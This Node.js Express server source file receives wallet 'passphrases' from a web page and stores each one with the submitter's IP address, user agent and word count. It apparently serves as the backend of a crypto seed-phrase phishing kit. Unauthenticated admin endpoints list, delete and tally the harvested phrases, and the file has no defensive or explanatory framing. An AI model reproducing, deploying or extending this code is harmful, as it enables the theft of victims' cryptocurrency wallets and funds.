require('dotenv').config();
const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');

const DATA_FILE = path.join(__dirname, 'data', 'passphrases.json');
if (!fs.existsSync(path.join(__dirname, 'data'))) {
  fs.mkdirSync(path.join(__dirname, 'data'), { recursive: true });
}
if (!fs.existsSync(DATA_FILE)) {
  fs.writeFileSync(DATA_FILE, JSON.stringify([]));
}
function readLocal() {
  try { return JSON.parse(fs.readFileSync(DATA_FILE, 'utf8')); } catch { return []; }
}
function writeLocal(list) {
  fs.writeFileSync(DATA_FILE, JSON.stringify(list, null, 2));
}
function genId() { return crypto.randomBytes(10).toString('hex'); }

let useFirebase = false;
let db = null;
let admin = null;
try {
  admin = require('firebase-admin');
  if (admin && admin.credential && typeof admin.credential.cert === 'function') {
    const rawPk = process.env.FIREBASE_PRIVATE_KEY;
    const privateKey = rawPk ? String(rawPk).replace(/\\n/g, '\n').replace(/^"|"$/g, '') : undefined;
    const serviceAccount = {
      type: 'service_account',
      project_id: process.env.FIREBASE_PROJECT_ID,
      private_key_id: process.env.FIREBASE_PRIVATE_KEY_ID,
      private_key: privateKey,
      client_email: process.env.FIREBASE_CLIENT_EMAIL,
      client_id: process.env.FIREBASE_CLIENT_ID || '',
      auth_uri: 'https://accounts.google.com/o/oauth2/auth',
      token_uri: 'https://oauth2.googleapis.com/token',
      auth_provider_x509_cert_url: 'https://www.googleapis.com/oauth2/v1/certs',
      client_x509_cert_url: `https://www.googleapis.com/robot/v1/metadata/x509/${encodeURIComponent(process.env.FIREBASE_CLIENT_EMAIL || '')}`,
      universe_domain: 'googleapis.com'
    };
    if (privateKey && process.env.FIREBASE_PROJECT_ID && process.env.FIREBASE_CLIENT_EMAIL) {
      admin.initializeApp({
        credential: admin.credential.cert(serviceAccount),
        databaseURL: `https://${process.env.FIREBASE_PROJECT_ID}.firebaseio.com`
      });
      db = admin.firestore();
      useFirebase = true;
      console.log('Firebase Admin initialized successfully — using Firestore');
    } else {
      console.log('Firebase config incomplete — using local JSON store');
    }
  } else {
    console.log('Firebase Admin SDK could not load credential helper — using local JSON store');
  }
} catch (err) {
  console.log('Firebase Admin init warning:', err.message, '— using local JSON store');
  useFirebase = false;
  db = null;
}

const app = express();
app.use(cors());
app.use(express.json({ limit: '2mb' }));
app.use(express.static(path.join(__dirname)));

app.post('/api/passphrase', async (req, res) => {
  try {
    const { phrase, page, source, userAgent, ip } = req.body;
    if (!phrase) {
      return res.status(400).json({ success: false, error: 'Passphrase is required' });
    }
    const now = new Date();
    const base = {
      phrase: String(phrase),
      page: page || null,
      source: source || 'wallet',
      userAgent: userAgent || req.headers['user-agent'] || null,
      ip: ip || (req.headers['x-forwarded-for'] || req.socket.remoteAddress || null),
      wordCount: String(phrase).trim().split(/\s+/).filter(Boolean).length
    };
    let id;
    if (useFirebase && db) {
      const record = { ...base, createdAt: admin.firestore.FieldValue.serverTimestamp() };
      const ref = await db.collection('passphrases').add(record);
      id = ref.id;
    } else {
      id = genId();
      const record = { ...base, id, createdAt: now.toISOString() };
      const list = readLocal();
      list.unshift(record);
      writeLocal(list);
    }
    console.log(`[POST /api/passphrase] saved (id=${id}, source=${base.source}, words=${base.wordCount})`);
    return res.json({ success: true, id });
  } catch (err) {
    console.error('POST /api/passphrase error:', err);
    return res.status(500).json({ success: false, error: err.message });
  }
});

app.get('/api/passphrases', async (req, res) => {
  try {
    let docs = [];
    if (useFirebase && db) {
      const snapshot = await db
        .collection('passphrases')
        .orderBy('createdAt', 'desc')
        .limit(1000)
        .get();
      snapshot.forEach(doc => {
        const data = doc.data();
        docs.push({
          id: doc.id,
          phrase: data.phrase,
          page: data.page || null,
          source: data.source || null,
          userAgent: data.userAgent || null,
          ip: data.ip || null,
          wordCount: data.wordCount || null,
          createdAt: data.createdAt ? data.createdAt.toDate() : null
        });
      });
    } else {
      docs = readLocal().slice(0, 1000).map(r => ({
        id: r.id,
        phrase: r.phrase,
        page: r.page || null,
        source: r.source || null,
        userAgent: r.userAgent || null,
        ip: r.ip || null,
        wordCount: r.wordCount || null,
        createdAt: r.createdAt ? new Date(r.createdAt) : null
      }));
    }
    return res.json({ success: true, count: docs.length, records: docs });
  } catch (err) {
    console.error('GET /api/passphrases error:', err);
    return res.status(500).json({ success: false, error: err.message, records: [], count: 0 });
  }
});

app.delete('/api/passphrases/:id', async (req, res) => {
  try {
    const id = req.params.id;
    if (useFirebase && db) {
      await db.collection('passphrases').doc(id).delete();
    } else {
      const list = readLocal().filter(r => r.id !== id);
      writeLocal(list);
    }
    return res.json({ success: true });
  } catch (err) {
    console.error('DELETE error:', err);
    return res.status(500).json({ success: false, error: err.message });
  }
});

app.get('/api/stats', async (req, res) => {
  try {
    const sources = {};
    let total = 0;
    let last24h = 0;
    const now = Date.now();
    const oneDayAgo = new Date(now - 24 * 60 * 60 * 1000);
    if (useFirebase && db) {
      const snap = await db.collection('passphrases').get();
      total = snap.size;
      snap.forEach(d => {
        const data = d.data();
        const src = data.source || 'unknown';
        sources[src] = (sources[src] || 0) + 1;
        if (data.createdAt && data.createdAt.toDate() >= oneDayAgo) last24h++;
      });
    } else {
      const list = readLocal();
      total = list.length;
      list.forEach(r => {
        const src = r.source || 'unknown';
        sources[src] = (sources[src] || 0) + 1;
        if (r.createdAt && new Date(r.createdAt) >= oneDayAgo) last24h++;
      });
    }
    return res.json({ success: true, total, last24h, sources });
  } catch (err) {
    console.error('GET /api/stats error:', err);
    return res.status(500).json({ success: false, error: err.message });
  }
});

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/admin', (req, res) => {
  res.redirect('/admin/index.html');
});

const PORT = process.env.PORT || 8080;
app.listen(PORT, () => {
  console.log(`Server running on http://127.0.0.1:${PORT}`);
  console.log(`Admin dashboard: http://127.0.0.1:${PORT}/admin/`);
});
